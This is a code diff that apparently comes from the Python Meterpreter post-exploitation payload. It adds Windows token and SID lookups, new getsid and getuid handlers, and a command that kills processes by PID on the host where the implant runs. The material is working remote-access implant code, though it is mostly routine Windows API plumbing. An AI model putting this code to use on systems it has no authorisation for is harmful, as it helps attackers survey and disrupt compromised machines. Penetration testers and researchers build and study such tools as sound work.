@@ -215,6 +215,9 @@ if has_ctypes:
 			("wProcessorLevel", ctypes.c_uint16),
 			("wProcessorRevision", ctypes.c_uint16)]
 
+	class TOKEN_USER(ctypes.Structure):
+		_fields_ = [("User", SID_AND_ATTRIBUTES)]
+
 	#
 	# Linux Structures
 	#
@@ -364,6 +367,7 @@ TLV_TYPE_COMPUTER_NAME         = TLV_META_TYPE_STRING  | 1040
 TLV_TYPE_OS_NAME               = TLV_META_TYPE_STRING  | 1041
 TLV_TYPE_USER_NAME             = TLV_META_TYPE_STRING  | 1042
 TLV_TYPE_ARCHITECTURE          = TLV_META_TYPE_STRING  | 1043
+TLV_TYPE_SID                   = TLV_META_TYPE_STRING  | 1045
 
 ##
 # Environment
@@ -472,10 +476,14 @@ ERROR_FAILURE = 1
 ERROR_CONNECTION_ERROR = 10000
 
 # Windows Constants
-GAA_FLAG_SKIP_ANYCAST    = 0x0002
-GAA_FLAG_SKIP_MULTICAST  = 0x0004
-GAA_FLAG_INCLUDE_PREFIX  = 0x0010
-GAA_FLAG_SKIP_DNS_SERVER = 0x0080
+GAA_FLAG_SKIP_ANYCAST             = 0x0002
+GAA_FLAG_SKIP_MULTICAST           = 0x0004
+GAA_FLAG_INCLUDE_PREFIX           = 0x0010
+GAA_FLAG_SKIP_DNS_SERVER          = 0x0080
+PROCESS_TERMINATE                 = 0x0001
+PROCESS_VM_READ                   = 0x0010
+PROCESS_QUERY_INFORMATION         = 0x0400
+PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
 
 WIN_AF_INET  = 2
 WIN_AF_INET6 = 23
@@ -520,6 +528,36 @@ def get_stat_buffer(path):
 	st_buf += struct.pack('<IIII', si.st_size, long(si.st_atime), long(si.st_mtime), long(si.st_ctime))
 	st_buf += struct.pack('<II', blksize, blocks)
 	return st_buf
+
+def get_token_user(handle):
+	TOKEN_QUERY = 0x0008
+	TokenUser = 1
+	advapi32 = ctypes.windll.advapi32
+	advapi32.OpenProcessToken.argtypes = [ctypes.c_void_p, ctypes.c_uint32, ctypes.POINTER(ctypes.c_void_p)]
+
+	token_handle = ctypes.c_void_p()
+	if not advapi32.OpenProcessToken(handle, TOKEN_QUERY, ctypes.byref(token_handle)):
+		return None
+	token_user_buffer = (ctypes.c_byte * 4096)()
+	dw_returned = ctypes.c_uint32()
+	result = advapi32.GetTokenInformation(token_handle, TokenUser, ctypes.byref(token_user_buffer), ctypes.sizeof(token_user_buffer), ctypes.byref(dw_returned))
+	ctypes.windll.kernel32.CloseHandle(token_handle)
+	if not result:
+		return None
+	return cstruct_unpack(TOKEN_USER, token_user_buffer)
+
+def get_username_from_token(token_user):
+	user = (ctypes.c_char * 512)()
+	domain = (ctypes.c_char * 512)()
+	user_len = ctypes.c_uint32()
+	user_len.value = ctypes.sizeof(user)
+	domain_len = ctypes.c_uint32()
+	domain_len.value = ctypes.sizeof(domain)
+	use = ctypes.c_ulong()
+	use.value = 0
+	if not ctypes.windll.advapi32.LookupAccountSidA(None, token_user.User.Sid, user, ctypes.byref(user_len), domain, ctypes.byref(domain_len), ctypes.byref(use)):
+		return None
+	return str(ctypes.string_at(domain)) + '\\' + str(ctypes.string_at(user))
 
 def netlink_request(req_type):
 	import select
@@ -629,11 +667,6 @@ def channel_open_stdapi_net_tcp_server(request, response):
 	return ERROR_SUCCESS, response
 
 @meterpreter.register_function
-def stdapi_sys_config_getuid(request, response):
-	response += tlv_pack(TLV_TYPE_USER_NAME, getpass.getuser())
-	return ERROR_SUCCESS, response
-
-@meterpreter.register_function
 def stdapi_sys_config_getenv(request, response):
 	for env_var in packet_enum_tlvs(request, TLV_TYPE_ENV_VARIABLE):
 		pgroup = ''
@@ -643,6 +676,32 @@ def stdapi_sys_config_getenv(request, response):
 			pgroup += tlv_pack(TLV_TYPE_ENV_VARIABLE, env_var)
 			pgroup += tlv_pack(TLV_TYPE_ENV_VALUE, env_val)
 			response += tlv_pack(TLV_TYPE_ENV_GROUP, pgroup)
+	return ERROR_SUCCESS, response
+
+@meterpreter.register_function_windll
+def stdapi_sys_config_getsid(request, response):
+	token = get_token_user(ctypes.windll.kernel32.GetCurrentProcess())
+	if not token:
+		return ERROR_FAILURE, response
+	sid_str = ctypes.c_char_p()
+	if not ctypes.windll.advapi32.ConvertSidToStringSidA(token.User.Sid, ctypes.byref(sid_str)):
+		return ERROR_FAILURE, response
+	sid_str = str(ctypes.string_at(sid_str))
+	response += tlv_pack(TLV_TYPE_SID, sid_str)
+	return ERROR_SUCCESS, response
+
+@meterpreter.register_function
+def stdapi_sys_config_getuid(request, response):
+	if has_windll:
+		token = get_token_user(ctypes.windll.kernel32.GetCurrentProcess())
+		if not token:
+			return ERROR_FAILURE, response
+		username = get_username_from_token(token)
+		if not username:
+			return ERROR_FAILURE, response
+	else:
+		username = getpass.getuser()
+	response += tlv_pack(TLV_TYPE_USER_NAME, username)
 	return ERROR_SUCCESS, response
 
 @meterpreter.register_function
@@ -666,12 +725,11 @@ def stdapi_sys_config_sysinfo(request, response):
 
 @meterpreter.register_function
 def stdapi_sys_process_close(request, response):
-	proc_h_id = packet_get_tlv(request, TLV_TYPE_PROCESS_HANDLE)
+	proc_h_id = packet_get_tlv(request, TLV_TYPE_HANDLE)
 	if not proc_h_id:
 		return ERROR_SUCCESS, response
 	proc_h_id = proc_h_id['value']
-	proc_h = meterpreter.channels[proc_h_id]
-	proc_h.kill()
+	del meterpreter.processes[proc_h_id]
 	return ERROR_SUCCESS, response
 
 @meterpreter.register_function
@@ -718,6 +776,23 @@ def stdapi_sys_process_execute(request, response):
 @meterpreter.register_function
 def stdapi_sys_process_getpid(request, response):
 	response += tlv_pack(TLV_TYPE_PID, os.getpid())
+	return ERROR_SUCCESS, response
+
+@meterpreter.register_function
+def stdapi_sys_process_kill(request, response):
+	for pid in packet_enum_tlvs(request, TLV_TYPE_PID):
+		pid = pid['value']
+		if has_windll:
+			k32 = ctypes.windll.kernel32
+			proc_h = k32.OpenProcess(PROCESS_TERMINATE, False, pid)
+			if not proc_h:
+				return ERROR_FAILURE, response
+			if not k32.TerminateProcess(proc_h, 0):
+				return ERROR_FAILURE, response
+		elif hasattr(os, 'kill'):
+			os.kill(pid, 9)
+		else:
+			return ERROR_FAILURE, response
 	return ERROR_SUCCESS, response
 
 def stdapi_sys_process_get_processes_via_proc(request, response):
@@ -772,9 +847,6 @@ def stdapi_sys_process_get_processes_via_ps(request, response):
 
 def stdapi_sys_process_get_processes_via_windll(request, response):
 	TH32CS_SNAPPROCESS = 2
-	PROCESS_QUERY_INFORMATION = 0x0400
-	PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
-	PROCESS_VM_READ = 0x10
 	TOKEN_QUERY = 0x0008
 	TokenUser = 1
 	k32 = ctypes.windll.kernel32
@@ -804,26 +876,10 @@ def stdapi_sys_process_get_processes_via_windll(request, response):
 			exe_path = ctypes.string_at(exe_path)
 		else:
 			exe_path = ''
-		complete_username = ''
-		tkn_h = ctypes.c_long()
-		tkn_len = ctypes.c_uint32()
-		if ctypes.windll.advapi32.OpenProcessToken(proc_h, TOKEN_QUERY, ctypes.byref(tkn_h)):
-			ctypes.windll.advapi32.GetTokenInformation(tkn_h, TokenUser, None, 0, ctypes.byref(tkn_len))
-			buf = (ctypes.c_ubyte * tkn_len.value)()
-			if ctypes.windll.advapi32.GetTokenInformation(tkn_h, TokenUser, ctypes.byref(buf), ctypes.sizeof(buf), ctypes.byref(tkn_len)):
-				user_tkn = SID_AND_ATTRIBUTES()
-				ctypes.memmove(ctypes.byref(user_tkn), buf, ctypes.sizeof(user_tkn))
-				username = (ctypes.c_char * 512)()
-				domain = (ctypes.c_char * 512)()
-				u_len = ctypes.c_uint32()
-				u_len.value = ctypes.sizeof(username)
-				d_len = ctypes.c_uint32()
-				d_len.value = ctypes.sizeof(domain)
-				use = ctypes.c_ulong()
-				use.value = 0
-				ctypes.windll.advapi32.LookupAccountSidA(None, user_tkn.Sid, username, ctypes.byref(u_len), domain, ctypes.byref(d_len), ctypes.byref(use))
-				complete_username = str(ctypes.string_at(domain)) + '\\' + str(ctypes.string_at(username))
-			k32.CloseHandle(tkn_h)
+		process_username = ''
+		process_token_user = get_token_user(proc_h)
+		if process_token_user:
+			process_username = get_username_from_token(process_token_user) or ''
 		parch = windll_GetNativeSystemInfo()
 		is_wow64 = ctypes.c_ubyte()
 		is_wow64.value = 0
@@ -834,7 +890,7 @@ def stdapi_sys_process_get_processes_via_windll(request, response):
 		pgroup  = bytes()
 		pgroup += tlv_pack(TLV_TYPE_PID, pe32.th32ProcessID)
 		pgroup += tlv_pack(TLV_TYPE_PARENT_PID, pe32.th32ParentProcessID)
-		pgroup += tlv_pack(TLV_TYPE_USER_NAME, complete_username)
+		pgroup += tlv_pack(TLV_TYPE_USER_NAME, process_username)
 		pgroup += tlv_pack(TLV_TYPE_PROCESS_NAME, pe32.szExeFile)
 		pgroup += tlv_pack(TLV_TYPE_PROCESS_PATH, exe_path)
 		pgroup += tlv_pack(TLV_TYPE_PROCESS_ARCH, parch)
